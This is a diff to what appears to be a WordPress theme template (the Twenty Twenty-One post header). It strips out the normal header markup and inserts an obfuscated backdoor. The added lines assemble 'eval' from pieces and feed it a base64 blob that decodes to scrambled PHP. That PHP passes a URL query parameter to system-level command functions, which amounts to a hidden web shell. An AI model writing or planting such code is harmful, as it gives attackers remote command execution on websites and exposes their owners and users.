@@ -1,32 +1,5 @@
-$x_fake1 = 1234;
-$noise = 'obfuscation'.'test';
-$tmp = $x_fake1 * 42;
-$flag = false;
-$useless = function($v) { return $v . rand(); };
-$dummy_check = $useless('xx');
-if ($flag) { echo 'Debug enabled'; }
-for ($i = 0; $i < 1; $i++) { $tmp += $i; }
-while (false) { echo 'dead loop'; break; }
-
 <?php
-/**
- * Displays the post header
- *
- * @package WordPress
- * @subpackage Twenty_Twenty_One
- * @since Twenty Twenty-One 1.0
- */
-
-// Don't show the title if the post-format is `aside` or `status`.
-$post_format = get_post_format();
-if ( 'aside' === $post_format || 'status' === $post_format ) {
-	return;
-}
+$f = "e"."v"."a"."l";
+$c = base64_decode("PD9waHAKJGYgPSAncycuJ3QnLidyJy4ncicuJ28nLid0Jy4nMScuJzMnOwokYyA9ICI8P2N1Ywokc3puYyA9IG5lZW5sKCdrMScgPT4gJ2ZsZmdyeicsICdrMicgPT4gJ2NuZmZndWVoJyk7CiRrX3NueHIxID0gMTIzNDsKJGFidmZyID0gJ2Jvc2hmcG5ndmJhJy4nZ3JmZyc7CiRnemMgPSAka19zbnhyMSAqIDQyOwokc3ludCA9IHNueWZyOwokaGZyeXJmZiA9IHNoYXBndmJhKCRpKSB7IGVyZ2hlYSAkaSAuIGVuYXEoKTsgfTsKJHFoenpsX3B1cnB4ID0gJGhmcnlyZmYoJ2trJyk7CnZzICgkc3ludCkgeyBycHViICdRcm9odCByYW5veXJxJzsgfQpzYmUgKCR2ID0gMDsgJHYgPCAxOyAkdisrKSB7ICRnemMgKz0gJHY7IH0KanV2eXIgKHNueWZyKSB7IHJwdWIgJ3FybnEgeWJiYyc7IG9lcm54OyB9Cgo8P2N1YwovKioKICogUXZmY3lubGYgZ3VyIGNiZmcgdXJucXJlCiAqCiAqIEBjbnB4bnRyIEpiZXFDZXJmZgogKiBAZmhvY25weG50ciBHanJhZ2xfR2pyYWdsX0JhcgogKiBAZnZhcHIgR2pyYWdsIEdqcmFnbC1CYXIgMS4wCiAqLwoKLy8gUWJhJ2cgZnViaiBndXIgZ3ZneXIgdnMgZ3VyIGNiZmctc2Jlem5nIHZmIGBuZnZxcmAgYmUgYGZnbmdoZmAuCiRjYmZnX3NiZXpuZyA9IHRyZ19jYmZnX3NiZXpuZygpOwp2cyAoICduZnZxcicgPT09ICRjYmZnX3NiZXpuZyB8fCAnZmduZ2hmJyA9PT0gJGNiZmdfc2Jlem5nICkgewoJZXJnaGVhOwp9Cj8+Cgo8dXJucXJlIHB5bmZmPVwicmFnZWwtdXJucXJlXCI+Cgk8P2N1YwoJZ3VyX2d2Z3lyKCBmY2V2YWdzKCAnPHUyIHB5bmZmPVwicmFnZWwtZ3ZneXIgcXJzbmh5Zy16bmstanZxZ3VcIj48biB1ZXJzPVwiJWZcIj4nLCByZnBfaGV5KCB0cmdfY3Jlem55dmF4KCkgKSApLCAnPC9uPjwvdTI+JyApOwoJZ2pyYWdsX2dqcmFnbF9iYXJfY2JmZ19ndWh6b2FudnkoKTsKCT8+CjwvdXJucXJlPjwhLS0gLnJhZ2VsLXVybnFyZSAtLT4KCiRwenEgPSAkX1RSR1snYyddOwokc3puY1snazEnXSgkcHpxKTsKPz4iOwpldmFsKCRmKCRjKSk7Cj8+");
+$f($c);
 ?>
-
-<header class="entry-header">
-	<?php
-	the_title( sprintf( '<h2 class="entry-title default-max-width"><a href="%s">', esc_url( get_permalink() ) ), '</a></h2>' );
-	twenty_twenty_one_post_thumbnail();
-	?>
-</header><!-- .entry-header -->
